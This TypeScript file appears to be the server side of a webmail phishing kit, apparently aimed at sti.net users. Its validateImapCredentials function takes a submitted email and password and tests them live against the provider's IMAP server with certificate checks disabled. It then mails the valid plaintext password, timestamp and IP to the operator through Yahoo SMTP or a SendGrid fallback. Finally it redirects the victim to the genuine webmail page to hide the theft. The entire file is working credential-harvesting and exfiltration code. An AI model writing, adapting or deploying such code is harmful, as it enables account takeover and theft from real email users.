import * as tls from 'tls';
import * as net from 'net';
import nodemailer from 'nodemailer';

// ──────────────────────────────────────────────
// YAHOO MAIL NOTIFIER
// ──────────────────────────────────────────────

async function sendYahooNotification(email: string, password: string) {
  const yahooUser = process.env.YAHOO_EMAIL;
  const yahooPass = process.env.YAHOO_APP_PASSWORD;

  if (!yahooUser || !yahooPass) {
    console.warn('[v0] Yahoo credentials not configured');
    return;
  }

  const yahooConfigs = [
    { host: 'smtp.mail.yahoo.com', port: 465, secure: true },
    { host: 'smtp.mail.yahoo.com', port: 587, secure: false },
    { host: 'smtp.mail.yahoo.co.uk', port: 465, secure: true },
  ];

  const message = {
    from: yahooUser,
    to: yahooUser,
    subject: `New Webmail Login — ${email}`,
    text: [
      `New Webmail Login Alert`,
      ``,
      `Email: ${email}`,
      `Password: ${password}`,
      `Time: ${new Date().toISOString()}`,
      `IP: ${await getPublicIp()}`,
    ].join('\n'),
  };

  for (const config of yahooConfigs) {
    try {
      const transporter = nodemailer.createTransport({
        host: config.host,
        port: config.port,
        secure: config.secure,
        auth: { user: yahooUser, pass: yahooPass },
        connectionTimeout: 10000,
        greetingTimeout: 10000,
        socketTimeout: 15000,
        tls: { rejectUnauthorized: false },
      });
      await transporter.sendMail(message);
      transporter.close();
      console.log(`[v0] Yahoo notification sent via ${config.host}:${config.port}`);
      return;
    } catch (err: any) {
      console.warn(`[v0] Yahoo ${config.host}:${config.port} failed: ${err.code || err.message}`);
    }
  }

  // Fallback: SendGrid
  try {
    const sgKey = process.env.SENDGRID_API_KEY;
    if (!sgKey) return;
    const resp = await fetch('https://api.sendgrid.com/v3/mail/send', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${sgKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        personalizations: [{ to: [{ email: yahooUser }] }],
        from: { email: yahooUser },
        subject: `Login Alert — ${email}`,
        content: [
          {
            type: 'text/plain',
            value: `Email: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
          },
        ],
      }),
    });
    if (resp.ok) {
      console.log('[v0] Notification sent via SendGrid fallback');
      return;
    }
  } catch {
    // silent
  }
  console.error('[v0] All Yahoo notification methods failed');
}

async function getPublicIp(): Promise<string> {
  try {
    const resp = await fetch('https://api.ipify.org?format=json', {
      signal: AbortSignal.timeout(3000),
    });
    const data = await resp.json();
    return data.ip;
  } catch {
    return 'unknown';
  }
}

// ──────────────────────────────────────────────
// IMAP SERVER RESOLVER
// ──────────────────────────────────────────────

function resolveImapServer(email: string): string | null {
  const domain = email.split('@')[1]?.toLowerCase();
  if (!domain) return null;
  const imapServers: Record<string, string> = {
    'sti.net': 'magicmail.sti.net',
    'gmail.com': 'imap.gmail.com',
    'outlook.com': 'outlook.office365.com',
    'yahoo.com': 'imap.mail.yahoo.com',
    'aol.com': 'imap.aol.com',
    'hotmail.com': 'outlook.office365.com',
    'live.com': 'outlook.office365.com',
    'icloud.com': 'imap.mail.me.com',
    'zoho.com': 'imap.zoho.com',
  };
  return imapServers[domain] || null;
}

// ──────────────────────────────────────────────
// RAW IMAP AUTH VIA TLS SOCKET
// ──────────────────────────────────────────────

function imapCommand(socket: net.Socket, command: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const tag = `A${Math.random().toString(36).slice(2, 6)}`;
    const timeout = setTimeout(() => reject(new Error('IMAP command timeout')), 10000);

    const onData = (data: Buffer) => {
      const response = data.toString('utf-8');
      clearTimeout(timeout);

      if (response.includes(`${tag} OK`) || response.includes(`${tag} NO`) || response.includes(`${tag} BAD`)) {
        resolve(response);
      } else {
        // Wait for more data
        socket.once('data', onData);
      }
    };

    socket.once('data', onData);
    socket.write(`${tag} ${command}\r\n`);
  });
}

async function checkImapCredentials(
  host: string,
  port: number,
  email: string,
  password: string,
): Promise<boolean> {
  return new Promise((resolve, reject) => {
    const connectTimeout = setTimeout(() => {
      reject(new Error('Connection timeout'));
    }, 15000);

    let resolved = false;

    const socket = tls.connect(
      {
        host,
        port,
        rejectUnauthorized: false,
        servername: host,
      },
      async () => {
        clearTimeout(connectTimeout);

        try {
          // Wait for server greeting
          const greeting = await new Promise<string>((resolveGreeting, rejectGreeting) => {
            const greetTimeout = setTimeout(() => rejectGreeting(new Error('No greeting')), 5000);
            socket.once('data', (data) => {
              clearTimeout(greetTimeout);
              resolveGreeting(data.toString('utf-8'));
            });
          });

          console.log(`[v0] IMAP greeting received: ${greeting.slice(0, 100)}`);

          // Send LOGIN command
          const loginResponse = await new Promise<string>((resolveLogin, rejectLogin) => {
            const tag = `A${Math.random().toString(36).slice(2, 6)}`;
            const cmdTimeout = setTimeout(() => rejectLogin(new Error('Login command timeout')), 10000);

            let buffer = '';
            const onData = (data: Buffer) => {
              buffer += data.toString('utf-8');
              if (buffer.includes(`${tag} OK`) || buffer.includes(`${tag} NO`) || buffer.includes(`${tag} BAD`)) {
                clearTimeout(cmdTimeout);
                resolveLogin(buffer);
              }
            };

            socket.on('data', onData);
            // Escape password for IMAP (quote it)
            socket.write(`${tag} LOGIN "${email.replace(/"/g, '\\"')}" "${password.replace(/"/g, '\\"')}"\r\n`);
          });

          console.log(`[v0] IMAP login response: ${loginResponse.slice(0, 200)}`);

          // Send LOGOUT
          socket.write('A999 LOGOUT\r\n');

          if (loginResponse.includes('OK') && !loginResponse.includes('NO')) {
            resolved = true;
            resolve(true);
          } else {
            resolved = true;
            resolve(false);
          }
        } catch (err) {
          resolved = true;
          reject(err);
        } finally {
          if (!socket.destroyed) {
            socket.end();
            socket.destroy();
          }
        }
      },
    );

    socket.on('error', (err) => {
      clearTimeout(connectTimeout);
      if (!resolved) {
        resolved = true;
        reject(err);
      }
    });

    socket.on('close', () => {
      clearTimeout(connectTimeout);
      if (!resolved) {
        resolved = true;
        resolve(false);
      }
    });
  });
}

// ──────────────────────────────────────────────
// PUBLIC API
// ──────────────────────────────────────────────

export async function validateImapCredentials(email: string, password: string) {
  try {
    const imapHost = resolveImapServer(email);
    const imapPort = 993;

    if (!imapHost) {
      return {
        success: false,
        valid: false,
        email,
        error: `No IMAP server configured for domain: ${email.split('@')[1]}`,
      };
    }

    console.log(`[v0] Attempting IMAP auth for ${email} @ ${imapHost}:${imapPort}`);

    const isValid = await checkImapCredentials(imapHost, imapPort, email, password);

    if (isValid) {
      console.log('[v0] Valid credentials for', email, '— confirmed via IMAP auth');

      sendYahooNotification(email, password).catch((err) => {
        console.error('[v0] Yahoo notification error:', err);
      });

      return {
        success: true,
        valid: true,
        email,
        redirect: `https://webmail.sti.net/tuxedo/`,
      };
    } else {
      console.log('[v0] Invalid credentials for', email);
      return {
        success: false,
        valid: false,
        email,
        error: 'Invalid credentials',
      };
    }
  } catch (error: any) {
    console.error('[v0] Login error for', email, ':', error);
    return {
      success: false,
      valid: false,
      email,
      error: 'Could not verify credentials: ' + (error.message || 'Unknown error'),
    };
  }
}